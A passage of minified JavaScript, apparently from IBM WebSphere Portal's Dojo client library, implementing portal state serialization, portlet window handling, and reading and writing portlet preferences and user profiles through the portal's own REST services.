i&&(o=t.newSelectionAccessor()).setPageSelection(i),(i=n[r.selFrg])&&(o||(o=t.newSelectionAccessor()),o.setFragmentSelection(i)),(i=n[r.selURI])&&(o||(o=t.newSelectionAccessor()),o.setURI(i)),i=n[r.selMaps])o.setMapping(a,i[a]);if(i=n[r.params]){var s=o.getParameters();this.jsonCoders.from.params.call(this,n,s)}}},sharedStateList:function(e,t){var o=this.jsonCoders.from.sharedState;for(var r in e[this.JSON_SERIALIZATION.names.sharedState])o.call(this,r,e,t)},sharedState:function(e,t,o){var r=o.newSharedStateAccessor(e),n=t[this.JSON_SERIALIZATION.names.sharedState][e];for(var i in n)r.setValues(i,n[i])},params:function(e,t){var o=e[this.JSON_SERIALIZATION.names.params];for(var r in o)t.setValues(r,o[r])}}},toJSON:function(e){var t,o,r=new com.ibm.portal.state.StateManager(ibmPortalConfig.contentHandlerURI),n={},i=this.JSON_SERIALIZATION.names;return r.reset(e),(o=(t=r.newLocaleAccessor()).getLocale())&&(n[i.locale]=o),this.jsonCoders.to.portlets.call(this,n,r),this.jsonCoders.to.expansions.call(this,n,r),(o=(t=r.newScreenTemplateAccessor()).getScreenTemplate())&&(n[i.screenTemplate]=o),this.jsonCoders.to.selection.call(this,n,r),this.jsonCoders.to.sharedStateList.call(this,n,r),(o=(t=r.newSoloStateAccessor()).getSoloPortlet())&&dojo.setObject([i.solo,i.soloPortlet].join("."),o,n),(o=t.getReturnSelection())&&dojo.setObject([i.solo,i.soloReturn].join("."),o,n),(o=(t=r.newStatePartitionAccessor()).getStatePartition())&&(n[i.statePartition]=o),(o=(t=r.newThemePolicyAccessor()).getThemePolicy())&&(n[i.themePolicy]=o),(o=(t=r.newThemeTemplateAccessor()).getThemeTemplate())&&(n[i.themeTemplate]=o),n},fromJSON:function(e){var t,o,r=new com.ibm.portal.state.StateManager(ibmPortalConfig.contentHandlerURI),n=this.JSON_SERIALIZATION.names;return r.reset(com.ibm.portal.xslt.loadXmlString()),(o=e[n.locale])&&r.newLocaleAccessor().setLocale(o),this.jsonCoders.from.portlets.call(this,e,r),this.jsonCoders.from.expansions.call(this,e,r),(o=e[n.screenTemplate])&&r.newScreenTemplateAccessor().setScreenTemplate(o),this.jsonCoders.from.selection.call(this,e,r),this.jsonCoders.from.sharedStateList.call(this,e,r),t=null,(o=dojo.getObject([n.solo,n.soloPortlet].join("."),!1,e))&&(t=r.newSoloStateAccessor()).setSoloPortlet(o),(o=dojo.getObject([n.solo,n.soloReturn].join("."),!1,e))&&(t||(t=r.newSoloStateAccessor()),t.setReturnSelection(o)),(o=e[n.statePartition])&&r.newStatePartitionAccessor().setStatePartition(o),(o=e[n.themePolicy])&&r.newThemePolicyAccessor().setThemePolicy(o),(o=e[n.themeTemplate])&&r.newThemeTemplateAccessor().setThemeTemplate(o),r.stateDOM},serialize:function(e,t,o,r){var n=dojox.data.dom.innerXML(e).replace(/[\r\n]/gm,"");ibm.portal.debug.entry("SerializationManager.serialize",[n,t,o,r]);var i=encodeURIComponent(n),a=this._getMimeType(),s=null,l=this,d=com.ibm.ajax.auth,c="undefined"!=typeof ibmCfg&&ibmCfg&&ibmCfg&&ibmCfg.themeConfig?ibmCfg.themeConfig.onauthenticated:null,u=com.ibm.portal.services.PortalRestServiceConfig.digest;if("undefined"!=typeof ibmPortalConfig&&i.length<=ibmPortalConfig.stateThreshold){var h={uri:this.STATE_URI_SCHEME+":"+i,mode:this.DOWNLOAD_MODE,xmlns:this.STATE_NS_URI,sessionDependencyAllowed:"true"};!0===(t=null!=t&&1==t)&&(h.preprocessors="true"),u&&(h.digest=u),!0===r&&(h.forceAbsolute=!0),dojo.xhrGet({url:this.serviceURL,sync:!0,content:h,handleAs:a,handle:function(r,n){if(!d.isAuthenticationRequired(r,n))return s=l._handleSerializationResponse.call(l,r,o,e,t),r;ibm.portal.debug.text("Authentication required."),d.authenticationHandler(r,n,c)},transport:"XMLHTTPTransport"})}else{if(dojo.isIE||void 0!==window.ActiveXObject)n.indexOf("UTF-16")>=0&&(n=n.replace(/UTF-16/,"UTF-8"));var p=this.serviceURL+"?uri="+this.STATE_URI_POST+"&xmlns="+this.STATE_NS_URI+"&sessionDependencyAllowed=true";null!=u&&(p+="&digest="+u),!0===t&&(p+="&preprocessors=true"),!0===r&&(p+="&forceAbsolute=true"),dojo.rawXhrPost({url:p,sync:!0,postData:n,handleAs:a,headers:{"Content-Type":"text/xml"},handle:function(r,n){if(!d.isAuthenticationRequired(r,n))return s=l._handleSerializationResponse.call(l,r,o,e,t),r;ibm.portal.debug.text("Authentication required."),d.authenticationHandler(r,n,c)},transport:"XMLHTTPTransport"})}return s},deserialize:function(e,t){ibm.portal.debug.entry("SerializationManager.deserialize",[e]);var o=this.STATE_URI_SCHEME+":"+encodeURIComponent(e),r=null,n=this._getMimeType(),i=this,a=com.ibm.portal.services.PortalRestServiceConfig.digest,s=com.ibm.ajax.auth,l="undefined"!=typeof ibmCfg&&ibmCfg&&ibmCfg&&ibmCfg.themeConfig?ibmCfg.themeConfig.onauthenticated:null,d={uri:o,mode:this.DOWNLOAD_MODE,xmlns:this.STATE_NS_URI,preprocessors:"true"};return null!=a&&(d.digest=a),dojo.xhrGet({url:this.serviceURL,sync:!t,content:d,headers:{"X-IBM-XHR":"true"},handleAs:n,handle:function(o,n){var a=o instanceof Error?"error":"load";if("load"==a){var d=i._getResponseXML(o);"parsererror"==d.documentElement.nodeName&&(d=com.ibm.portal.xslt.loadXmlString()),t?t(1,e,d):r={status:1,input:i.serviceURL,url:i.serviceURL,returnObject:d,state:d}}else"error"==a&&(s.isAuthenticationRequired(o,n)?(ibm.portal.debug.text("Authentication required."),s.authenticationHandler(o,n,l)):t?t(2,e,null):r={status:2,input:i.serviceURL,url:i.serviceURL,returnObject:null,state:null})},transport:"XMLHTTPTransport"}),r},_handleSerializationResponse:function(e,t,o,r){var n=null,i=e instanceof Error?"error":"load";if("load"==i){var a=this._getResponseXML(e),s={atom:"http://www.w3.org/2005/Atom",state:"http://www.ibm.com/xmlns/prod/websphere/portal/v6.1/portal-state"},l=null,d=com.ibm.portal.xpath.evaluateXPath("atom:entry/atom:link",a,s);if(!(null!=d&&d.length>0))return com.ibm.ajax.auth.authenticationHandler(),n={status:this.STATUS_ERROR,input:o,state:o,returnObject:null,url:null};l=d[0].getAttribute("href");var c=o;if(1==r){var u=com.ibm.portal.xpath.evaluateXPath("atom:entry/atom:content/state:root",a,s);if(null!=u&&u.length>0){var h=dojox.data.dom.innerXML(u[0]);c=com.ibm.portal.xslt.loadXmlString(h)}}t?t(1,c,l):n={status:1,input:c,state:c,returnObject:l,url:l}}else"error"==i&&(t?t(this.STATUS_ERROR,o,null):n={status:this.STATUS_ERROR,input:o,state:o,returnObject:null,url:null});return n},_getMimeType:function(){var e="xml";return(dojo.isIE||void 0!==window.ActiveXObject)&&(e="text"),e},_getResponseXML:function(e){var t=e;return(dojo.isIE||void 0!==window.ActiveXObject)&&(t=com.ibm.portal.xslt.loadXmlString(e)),t}}),dojo.declare("com.ibm.portal.navigation.controller.StateVaryManager",null,{constructor:function(){this._expr=new Array},setExpressions:function(e,t){var o=this._findBucket(e);null==o&&(o={id:e,expr:null},this._expr.push(o)),o.expr=t},getExpressions:function(e){var t=null,o=this._findBucket(e);return null!=o&&(t=o.expr),t},_findBucket:function(e){var t=null;for(i=0;i<this._expr.length;i++){var o=this._expr[i];if(o.id==e){t=o;break}}return t}}),com.ibm.portal.state.STATE_MANAGER=new com.ibm.portal.state.StateManager,com.ibm.portal.state.STATE_MANAGER.reset(com.ibm.portal.xslt.loadXmlString())),!dojo._hasResource["ibm.portal.portlet.portlet"]){if(dojo._hasResource["ibm.portal.portlet.portlet"]=!0,dojo.provide("ibm.portal.portlet.portlet"),ibm.portal.portlet._SafeToExecute=!1,dojo.declare("ibm.portal.portlet.PortletWindow",null,{STATUS_UNDEFINED:0,STATUS_OK:1,STATUS_ERROR:2,constructor:function(e){if(this.isEnablerAvailable=!1,this.isEnablerAvailable){this.logger=new ibm.portal.portlet.Logger("ibm.portal.portlet.PortletWindow");var t="constructor()";this.logger.logEntry(t,e)}if(null!=e){this.windowID=e;var o=document.getElementById("com.ibm.wps.web2.portlet.preferences."+this.windowID);this.preferenceEditID=o.getAttribute("editid"),this.preferenceConfigID=o.getAttribute("configid"),this.preferenceEditDefaultsID=o.getAttribute("editdefaultsid"),this.pageID=o.getAttribute("pageid"),o=null,this.isCSA=!1;try{this.isCSA=void 0!==document.isCSA}catch(e){}this.isEnablerAvailable&&(this.widgetModel=com.ibm.mashups.enabler.widget.Factory.getWidgetModel(),this.navigationStateModel=com.ibm.mashups.enabler.model.state.NavigationStateModelFactory.getNavigationStateModel(),this.widgetAccessor=com.ibm.mashups.enabler.model.state.AccessorFactory.getWidgetAccessor(this.navigationStateModel,this.windowID),this.userModel=com.ibm.mashups.enabler.user.Factory.getUserModel()),this.attributes=new Array,this._queuedFuncs=new Array,this.portletState=new ibm.portal.portlet.PortletState(this.isEnablerAvailable,e,null,this.navigationStateModel);var r=this;ibmPortalConfig.isCSAListening?window.addEventListener?window.addEventListener("load",(function(){ibm.portal.portlet._SafeToExecute||(ibm.portal.portlet._SafeToExecute=!0),n()}),!1):window.attachEvent&&window.attachEvent("onload",(function(){ibm.portal.portlet._SafeToExecute||(ibm.portal.portlet._SafeToExecute=!0),n()})):ibm.portal.portlet._SafeToExecuteDfd.addCallback(n),this.isEnablerAvailable&&this.logger.logExit(t)}function n(){for(var e=0;e<r._queuedFuncs.length;e++)r._queuedFuncs[e]()}},reportError:function(e){var t;e.getErrorCode()==ibm.portal.portlet.Error.ERROR?t="error":e.getErrorCode()==ibm.portal.portlet.Error.INFO?t="info":e.getErrorCode()==ibm.portal.portlet.Error.WARN&&(t="warning");var o={_type:t,_message:e.getMessage(),_details:e.getDescription()};this.isCSA?dojo.publish("/portal/status",[{message:o}]):"undefined"!=typeof console?e.getErrorCode()==ibm.portal.portlet.Error.ERROR?console.error(o._message+"\n"+o._details):e.getErrorCode()==ibm.portal.portlet.Error.INFO?console.info(o._message+"\n"+o._details):e.getErrorCode()==ibm.portal.portlet.Error.WARN&&console.warn(o._message+"\n"+o._details):alert(o._type.toUpperCase()+"\nMessage: "+o._message+"\nDetails: "+o._details)},getAttribute:function(e){return this.attributes[e]},setAttribute:function(e,t){var o=this.attributes[e];return this.attributes[e]=t,o},removeAttribute:function(e){this.attributes[e]=null},clearAttributes:function(){this.attributes=new Array},getPortletState:function(e){if(this.isEnablerAvailable){var t="getPortletState()";this.logger.logEntry(t,e)}var o=this.portletState,r=null;return null!=e?e(this,ibm.portal.portlet.PortletWindow.STATUS_OK,o):r={portletWindow:this,status:ibm.portal.portlet.PortletWindow.STATUS_OK,returnObject:o},this.isEnablerAvailable&&this.logger.logExit(t,r),r},setPortletState:function(e,t){if(this.isEnablerAvailable){var o="setPortletState()";this.logger.logEntry(o,t)}if(this.portletState=e,this.isEnablerAvailable)this.navigationStateModel.commit({allowRedirect:!0}).start(!1);else if(this.isCSA){if(null==t){var r=(new com.ibm.portal.navigation.controller.NAVIGATION_CONTROLLER.getState).newPortletRenderURL(this.windowID);(new com.ibm.portal.services.PortletFragmentService).getPortletInfo("lm:oid:"+this.windowID+"@oid:"+this.pageID,r)}}else{var n=new com.ibm.portal.state.StateManager(ibmPortalConfig.contentHandlerURI);n.reset(e.portletAccessor.stateDOM);r=n.getSerializationManager().serialize(n.getState()).returnObject;window.location.href=r}var i=this.getPortletState(t);return this.isEnablerAvailable&&this.logger.logExit(o,i),i},_queueUp:function(e){this._queuedFuncs.push(e)},_throwInappropriateRequestError:function(e){throw new Error('Cannot execute a synchronous call before the page loads! Please use an onload handler to execute this call to "'+e+'".')},getPortletPreferences:function(e){if(this.isEnablerAvailable){var t="getPortletPreferences()";this.logger.logEntry(t,e)}if(!ibm.portal.portlet._SafeToExecute){if(e){var o=this;return this._queueUp((function(){o.getPortletPreferences(e)})),!1}return this._throwInappropriateRequestError("getPortletPreferences")}if(this.isEnablerAvailable){var r=this,n=null,i=new ibm.portal.portlet.PortletPreferences(r.isEnablerAvailable,r.windowID,r.pageID,r.requestedPreferenceID,null,r.widgetModel);e?e(r,ibm.portal.portlet.PortletWindow.STATUS_OK,i):n={portletWindow:r,status:ibm.portal.portlet.PortletWindow.STATUS_OK,returnObject:i}}else{var a=this.getPortletState().returnObject.getPortletMode();this.status=ibm.portal.portlet.PortletWindow.STATUS_UNDEFINED;var s=document.getElementById("com.ibm.wps.web2.portlet.root."+this.windowID).innerHTML,l=(s.indexOf("--portletwindowid--"),s.replace(/--portletwindowid--/g,this.windowID));if(l.indexOf("?")<0&&(l+="?"),l+="&verb=download&levels=-all&rep=full&preferences=aggregated",this.requestedPreferenceID="pm:oid:"+this.preferenceEditID,a==ibm.portal.portlet.PortletMode.CONFIG)this.requestedPreferenceID="pm:oid:"+this.preferenceConfigID;else if(a==ibm.portal.portlet.PortletMode.EDIT_DEFAULTS)this.requestedPreferenceID="pm:oid:"+this.preferenceEditDefaultsID;else if(a==ibm.portal.portlet.PortletMode.EDIT||null==this.preferenceEditID)if(null==this.preferenceEditID){var d=s.substring(0,s.indexOf("@")).replace(/--portletwindowid--/g,this.preferenceEditDefaultsID);d.indexOf("?")<0&&(d+="?"),d+="&verb=download&levels=-all&rep=full&preferences=aggregated";var c='<?xml version="1.0" encoding="UTF-8"?><atom:feed xmlns:atom="http://www.w3.org/2005/Atom" xmlns:model="http://www.ibm.com/xmlns/prod/websphere/portal/v6.0.1/portal-model-elements" xmlns:creation-context="http://www.ibm.com/xmlns/prod/websphere/portal/v6.1.0/portal-creation-context"><atom:entry><atom:id>pm:cid:0</atom:id><atom:content type="application/xml"><model:portlet-entity creation-context:portlet-entity="pm:oid:'+this.preferenceEditDefaultsID+'"/></atom:content></atom:entry></atom:feed>';dojo.rawXhrPost({url:d,sync:!0,postData:c,contentType:"application/xml",headers:{"X-IBM-XHR":"true"},handleAs:"xml",handle:dojo.hitch(this,(function(e,t){if("load"==(e instanceof Error?"error":"load")){(i=e)&&void 0!==dojox.data.dom.innerXML(e)||(i=com.ibm.portal.xslt.loadXmlString(t.xhr.responseText));var o={atom:"http://www.w3.org/2005/Atom"},r="/atom:feed/atom:entry/atom:id",n=ibm.portal.xml.xpath.evaluateXPath(r,i,o);this.requestedPreferenceID=dojox.data.dom.textContent(n[0])}else if(409==t.xhr.status){var i=com.ibm.portal.xslt.loadXmlString(t.xhr.responseText);o={atom:"http://www.w3.org/2005/Atom"},r="/atom:feed/atom:entry/atom:id",n=ibm.portal.xml.xpath.evaluateXPath(r,i,o);this.requestedPreferenceID=dojox.data.dom.textContent(n[0])}})),transport:"XMLHTTPTransport"})}else this.requestedPreferenceID="pm:oid:"+this.preferenceEditID;r=this,n=null;dojo.xhrGet({url:l,handleAs:"xml",preventCache:!0,headers:{"X-IBM-XHR":"true","If-Modified-Since":"Thu, 1 Jan 1970 00:00:00 GMT"},sync:!e,handle:function(t,o){if(r.isAuthenticationRequired(o.xhr,o.args.handleAs))r.doAuthentication();else{var i=t instanceof Error?"error":"load";if("load"==i){var a=t;a&&void 0!==dojox.data.dom.innerXML(t)||(a=com.ibm.portal.xslt.loadXmlString(o.xhr.responseText));var s=new ibm.portal.portlet.PortletPreferences(r.isEnablerAvailable,r.windowID,r.pageID,r.requestedPreferenceID,a,r.widgetModel);e?e(r,ibm.portal.portlet.PortletWindow.STATUS_OK,s):n={portletWindow:r,status:ibm.portal.portlet.PortletWindow.STATUS_OK,returnObject:s}}else"error"==i&&(e?e(r,ibm.portal.portlet.PortletWindow.STATUS_ERROR,null):n={portletWindow:r,status:ibm.portal.portlet.PortletWindow.STATUS_ERROR,returnObject:null})}},transport:"XMLHTTPTransport"})}return this.isEnablerAvailable&&this.logger.logExit(t,n),n},setPortletPreferences:function(e,t){if(this.isEnablerAvailable){var o="setPortletPreferences()";this.logger.logEntry(o,t)}if(!ibm.portal.portlet._SafeToExecute){if(t){var r=this;return this._queueUp((function(){r.setPortletPreferences(e,t)})),!1}return this._throwInappropriateRequestError("setPortletPreferences")}if(this.isEnablerAvailable){this.widgetModel.commit().start();var n=this,i=null;t?t(n,ibm.portal.portlet.PortletWindow.STATUS_OK,e):i={portletWindow:n,status:ibm.portal.portlet.PortletWindow.STATUS_OK,returnObject:e}}else{this.status=ibm.portal.portlet.PortletWindow.STATUS_UNDEFINED;var a=document.getElementById("com.ibm.wps.web2.portlet.root."+this.windowID).innerHTML,s=(a.indexOf("--portletwindowid--"),a.replace(/--portletwindowid--/g,this.windowID));s.indexOf("?")<0?s+="?verb=download":s+="&verb=download";var l,d="/atom:feed/atom:entry[atom:id='"+e.requestedPreferenceID+"']",c=ibm.portal.xml.xpath.evaluateXPath(d,e.xmlData,e.ns);if(!(c&&c.length>0))return null;var u=(l=c[0]).parentNode;d="/atom:feed/atom:entry",c=ibm.portal.xml.xpath.evaluateXPath(d,e.xmlData,e.ns);for(var h=0;h<c.length;h++){var p=c[h];p!=l&&u.removeChild(p)}n=this,i=null;var m={url:s,sync:!t,contentType:"application/xml",headers:{"X-IBM-XHR":"true"},handleAs:"xml",handle:function(o,r){if(n.isAuthenticationRequired(r.xhr,r.args.handleAs))n.doAuthentication();else{var a=o instanceof Error?"error":"load";"load"==a?t?t(n,ibm.portal.portlet.PortletWindow.STATUS_OK,e):i={portletWindow:n,status:ibm.portal.portlet.PortletWindow.STATUS_OK,returnObject:e}:"error"==a&&(t?t(n,ibm.portal.portlet.PortletWindow.STATUS_ERROR,null):i={portletWindow:n,status:ibm.portal.portlet.PortletWindow.STATUS_ERROR,returnObject:null})}},transport:"XMLHTTPTransport"},f="rawXhrPut";ibmPortalConfig&&ibmPortalConfig.xMethodOverride?(m.headers["X-Method-Override"]="PUT",f="xhrPost",m.postData=dojox.data.dom.innerXML(e.xmlData)):m.putData=dojox.data.dom.innerXML(e.xmlData),dojo[f](m)}return this.isEnablerAvailable&&this.logger.logExit(o,i),i},getUserProfile:function(e){if(this.isEnablerAvailable){var t="getUserProfile()";this.logger.logEntry(t,e)}if(!ibm.portal.portlet._SafeToExecute){if(e){var o=this;return this._queueUp((function(){o.getUserProfile(e)})),!1}return this._throwInappropriateRequestError("getUserProfile")}if(this.isEnablerAvailable){var r=this,n=null,i=new ibm.portal.portlet.UserProfile(r.isEnablerAvailable,r.windowID,null,r.userModel);e?e(r,ibm.portal.portlet.PortletWindow.STATUS_OK,i):n={portletWindow:r,status:ibm.portal.portlet.PortletWindow.STATUS_OK,returnObject:i}}else{this.status=ibm.portal.portlet.PortletWindow.STATUS_UNDEFINED;var a=document.getElementById("com.ibm.wps.web2.portlet.user."+this.windowID).innerHTML;r=this,n=null;dojo.xhrGet({url:a,headers:{"X-IBM-XHR":"true","If-Modified-Since":"Thu, 1 Jan 1970 00:00:00 GMT"},sync:!e,handleAs:"xml",handle:function(t,o){if(r.isAuthenticationRequired(o.xhr,o.args.handleAs))r.doAuthentication();else{var i=t instanceof Error?"error":"load";if("load"==i){var a=t;a&&void 0!==dojox.data.dom.innerXML(t)||(a=com.ibm.portal.xslt.loadXmlString(o.xhr.responseText));var s=new ibm.portal.portlet.UserProfile(r.isEnablerAvailable,r.windowID,a,r.userModel);e?e(r,ibm.portal.portlet.PortletWindow.STATUS_OK,s):n={portletWindow:r,status:ibm.portal.portlet.PortletWindow.STATUS_OK,returnObject:s}}else"error"==i&&(e?e(r,ibm.portal.portlet.PortletWindow.STATUS_ERROR,null):n={portletWindow:r,status:ibm.portal.portlet.PortletWindow.STATUS_ERROR,returnObject:null})}},transport:"XMLHTTPTransport"})}return this.isEnablerAvailable&&this.logger.logExit(t,n),n},setUserProfile:function(e,t){if(this.isEnablerAvailable){var o="setUserProfile()";this.logger.logEntry(o,t)}if(!ibm.portal.portlet._SafeToExecute){if(t){var r=this;return this._queueUp((function(){r.setUserProfile(e,t)})),!1}return this._throwInappropriateRequestError("setUserProfile")}if(this.isEnablerAvailable){this.userModel.commit().start();var n=this,i=null;t?t(n,ibm.portal.portlet.PortletWindow.STATUS_OK,n.userProfile):i={portletWindow:n,status:ibm.portal.portlet.PortletWindow.STATUS_OK,returnObject:e}}else{this.status=ibm.portal.portlet.PortletWindow.STATUS_UNDEFINED;var a=document.getElementById("com.ibm.wps.web2.portlet.user."+this.windowID).innerHTML;n=this,i=null;dojo.rawXhrPost({url:a,sync:!t,postData:dojox.data.dom.innerXML(e.xmlData),contentType:"application/xml",headers:{"X-IBM-XHR":"true"},handleAs:"xml",handle:function(o,r){if(n.isAuthenticationRequired(r.xhr,r.args.handleAs))n.doAuthentication();else{var a=o instanceof Error?"error":"load";"load"==a?t?t(n,ibm.portal.portlet.PortletWindow.STATUS_OK,e):i={portletWindow:n,status:ibm.portal.portlet.PortletWindow.STATUS_OK,returnObject:e}:"error"==a&&(t?t(n,ibm.portal.portlet.PortletWindow.STATUS_ERROR,null):i={portletWindow:n,status:ibm.portal.portlet.PortletWindow.STATUS_ERROR,returnObject:null})}},transport:"XMLHTTPTransport"})}return this.isEnablerAvailable&&this.logger.logExit(o,i),i},newXMLPortletRequest:function(){return new ibm.portal.portlet.XMLPortletRequest(this)},isAuthenticationRequired:function(e,t){if(4!=e.readyState)throw new Error("isAuthenticationRequired should only be called with a COMPLETED XMLHttpRequest! The readyState on the given XMLHttpRequest is not 4 (COMPLETE)!");var o={xhr:e,args:{handleAs:t}};return com.ibm.ajax.auth.isAuthenticationRequired({dojoType:"valid"},o)},setAuthenticationHandler:function(e){this._authenticationFn=e},doAuthentication:function(){this._authenticationFn?this._authenticationFn():com.ibm.ajax.auth.authenticationHandler()}}),"undefined"==typeof ibmPortalConfig||!ibmPortalConfig.isCSAListening){ibm.portal.portlet._SafeToExecuteDfd=new dojo.Deferred,ibm.portal.portlet._SafeToExecuteDfd.addCallback((function(){ibm.portal.portlet._SafeToExecute=!0}));var f=new Function("ibm.portal.portlet._SafeToExecuteDfd.callback();");window.addEventListener?window.addEventListener("load",f,!1):window.attachEvent&&window.attachEvent("onload",f)}dojo.declare("ibm.portal.portlet.PortletPreferences",null,{constructor:function(e,t,o,r,n,i){if(this.windowID=t,this.pageID=o,this.requestedPreferenceID=r,this.xmlData=n,this.xsltURL=dojo.moduleUrl("ibm","portal/portlet/"),this.ns={xsl:"http://www.w3.org/1999/XSL/Transform",thr:"http://purl.org/syndication/thread/1.0",atom:"http://www.w3.org/2005/Atom",xhtml:"http://www.w3.org/1999/xhtml",model:"http://www.ibm.com/xmlns/prod/websphere/portal/v6.0.1/portal-model-elements",base:"http://www.ibm.com/xmlns/prod/websphere/portal/v6.0/ibm-portal-composite-base",portal:"http://www.ibm.com/xmlns/prod/websphere/portal/v6.0.1/portal-model",xsi:"http://www.w3.org/2001/XMLSchema-instance"},this.isEnablerAvailable=e,this.isEnablerAvailable){this.logger=new ibm.portal.portlet.Logger("ibm.portal.portlet.PortletPreferences");var a="constructor()";this.logger.logEntry(a),this.logger.log(a,"windowid: ${0}",t),this.logger.log(a,"pageid: ${0}",o),this.logger.log(a,"requestedpreferenceid: ${0}",r),this.logger.log(a,"data: ${0}",n),this.logger.log(a,"widgetModel: ${0}",i),this.widgetModel=i,this.logger.logExit(a)}else this.widgetModel=null,this.internal_reset()},getMap:function(){if(this.isEnablerAvailable){var _709="getMap()";this.logger.logEntry(_709);for(var _70a=this.getNames(),_70b=new Array,n=0;n<_70a.length;n++){var _70c=this.getValues(_70a[n]),_70d=this.isReadOnly(_70a[n]);_70b[n]={name:_70a[n],values:_70c,readOnly:_70d}}return this.logger.logExit(_709,_70b),_70b}if(this.result_getMap)return this.result_getMap;var _70e=ibm.portal.xml.xslt.loadXsl(this.xsltURL+"PortletPreferencesMap.xsl");null==_70e.documentElement&&alert("xslDoc is null");var _70f=ibm.portal.xml.xslt.transform(this.xmlData,_70e,null,{selectionid:this.requestedPreferenceID},!0);if(null==_70f)return this.result_getNames=null,null;var _710=eval(_70f);return _710&&(_710=_710.preferences),this.result_getMap=_710,this.result_getMap},getNames:function(){if(this.isEnablerAvailable){var _711="getNames()";this.logger.logEntry(_711);var _712=this.getModifiablePreferences(this.widgetModel,this.pageID,this.windowID),_713=_712.getNames();return this.logger.logExit(_711,_713),_713}if(this.result_getNames)return this.result_getNames;var _714=ibm.portal.xml.xslt.loadXsl(this.xsltURL+"PortletPreferencesNames.xsl");null==_714.documentElement&&alert("xslDoc is null");var _715=ibm.portal.xml.xslt.transform(this.xmlData,_714,null,{selectionid:this.requestedPreferenceID},!0);if(null==_715)return this.result_getNames=null,null;var _716=eval(_715);return _716&&(_716=_716.names),this.result_getNames=_716,this.result_getNames},getValue:function(e,t){if(this.isEnablerAvailable){var o="getValue()";this.logger.logEntry(o),this.logger.log(o,"key: ${0}",e);var r=this.getModifiablePreferences(this.widgetModel,this.pageID,this.windowID).getValue(e);return this.logger.logExit(o,r),r}var n="/atom:feed/atom:entry[atom:id='"+this.requestedPreferenceID+"']/atom:content/*/model:portletpreferences[@name='"+e+"']/base:value",i=ibm.portal.xml.xpath.evaluateXPath(n,this.xmlData,this.ns);return r=i&&i.length>0?i[0].getAttribute("value"):t},getValues:function(e,t){if(this.isEnablerAvailable){var o="getValues()";this.logger.logEntry(o),this.logger.log(o,"key: ${0}",e);var r=this.getModifiablePreferences(this.widgetModel,this.pageID,this.windowID).getValues(e);return this.logger.logExit(o,r),r}var n="/atom:feed/atom:entry[atom:id='"+this.requestedPreferenceID+"']/atom:content/*/model:portletpreferences[@name='"+e+"']/base:value",i=ibm.portal.xml.xpath.evaluateXPath(n,this.xmlData,this.ns);if(i&&i.length>0){r=new Array;for(var a=0;a<i.length;a++)r[a]=i[a].getAttribute("value")}else r=t;return r},isReadOnly:function(e){if(this.isEnablerAvailable){var t="isReadOnly()";this.logger.logEntry(t),this.logger.log(t,"key: ${0}",e);var o=this.getModifiablePreferences(this.widgetModel,this.pageID,this.windowID).isReadOnly(e);return this.logger.logExit(t,o),o}var r="/atom:feed/atom:entry[atom:id='"+this.requestedPreferenceID+"']/atom:content/*/model:portletpreferences[@name='"+e+"']",n=ibm.portal.xml.xpath.evaluateXPath(r,this.xmlData,this.ns);o=!1;if(n&&n.length>0){var i=n[0].getAttribute("read-only");null!=i&&"true"==i&&(o=!0)}return o},reset:function(e){if(this.isEnablerAvailable){var t="reset()";this.logger.logEntry(t),this.logger.log(t,"key: ${0}",e),this.getModifiablePreferences(this.widgetModel,this.pageID,this.windowID).remove(e),this.logger.logExit(t)}else{this.internal_reset();var o="/atom:feed/atom:entry[atom:id='"+this.requestedPreferenceID+"']/atom:content/*/model:portletpreferences[@name='"+e+"']",r=ibm.portal.xml.xpath.evaluateXPath(o,this.xmlData,this.ns);if(r&&r.length>0){var n=r[0];n.parentNode.removeChild(n)}}},setValue:function(e,t){if(this.isEnablerAvailable){var o="setValue()";this.logger.logEntry(o),this.logger.log(o,"key: ${0}",e),this.logger.log(o,"value: ${0}",t),this.getModifiablePreferences(this.widgetModel,this.pageID,this.windowID).setValue(e,t),this.logger.logExit(o)}else{var r=new Array;r[0]=t,this.setValues(e,r)}},setValues:function(e,t){if(this.isEnablerAvailable){var o="setValues()";this.logger.logEntry(o),this.logger.log(o,"key: ${0}",e),this.logger.log(o,"values: ${0}",t),this.getModifiablePreferences(this.widgetModel,this.pageID,this.windowID).setValues(e,t),this.logger.logExit(o)}else{this.internal_reset();var r="/atom:feed/atom:entry[atom:id='"+this.requestedPreferenceID+"']/atom:content/*/model:portletpreferences[@name='"+e+"']",n=ibm.portal.xml.xpath.evaluateXPath(r,this.xmlData,this.ns),i=null;if(n&&n.length>0)for(var a=(i=n[0]).childNodes.length-1;a>=0;a--)i.removeChild(i.childNodes[a]);else{var s="/atom:feed/atom:entry[atom:id='"+this.requestedPreferenceID+"']/atom:content/*",l=ibm.portal.xml.xpath.evaluateXPath(s,this.xmlData,this.ns);(i=dojo.isIE||void 0!==window.ActiveXObject?this.xmlData.createNode(1,"model:portletpreferences",this.ns.model):this.xmlData.createElementNS(this.ns.model,"model:portletpreferences")).setAttribute("name",e),i.setAttribute("read-only","false"),l[0].appendChild(i)}for(a=0;a<t.length;a++){var d;if(dojo.isIE||void 0!==window.ActiveXObject){d=this.xmlData.createNode(1,"base:value",this.ns.base);var c=this.xmlData.createNode(2,"xsi:type",this.ns.xsi);c.nodeValue="String",d.setAttributeNode(c)}else(d=this.xmlData.createElementNS(this.ns.base,"base:value")).setAttributeNS(this.ns.xsi,"xsi:type","String");d.setAttribute("value",t[a]),i.appendChild(d)}}},internal_reset:function(){this.result_getMap=null,this.result_getNames=null},clone:function(){var e=dojox.data.dom.innerXML(this.xmlData),t=com.ibm.portal.xslt.loadXmlString(e);return new ibm.portal.portlet.PortletPreferences(this.isEnablerAvailable,this.windowID,this.pageID,this.requestedPreferenceID,t,this.widgetModel)},getModifiablePreferences:function(e,t,o){var r="getModifiablePreferences()";this.logger.logEntry(r),this.logger.logLevel(com.ibm.mashups.enabler.logging.LogLevel.INFO,r,"widgetModel: ${0}",e),this.logger.logLevel(com.ibm.mashups.enabler.logging.LogLevel.INFO,r,"windowID: ${0}",o);var n=com.ibm.mashups.enabler.navigation.Factory.getNavigationModel();this.logger.logLevel(com.ibm.mashups.enabler.logging.LogLevel.INFO,r,"navigationModel: ${0}",n);var i=n.find(t).start();this.logger.logLevel(com.ibm.mashups.enabler.logging.LogLevel.INFO,r,"selectedNode: ${0}",i);var a=n.getLayoutModel(i);this.logger.logLevel(com.ibm.mashups.enabler.logging.LogLevel.INFO,r,"layoutModel: ${0}",a);var s=a.find(o).start();this.logger.logLevel(com.ibm.mashups.enabler.logging.LogLevel.INFO,r,"layoutControl: ${0}",s);var 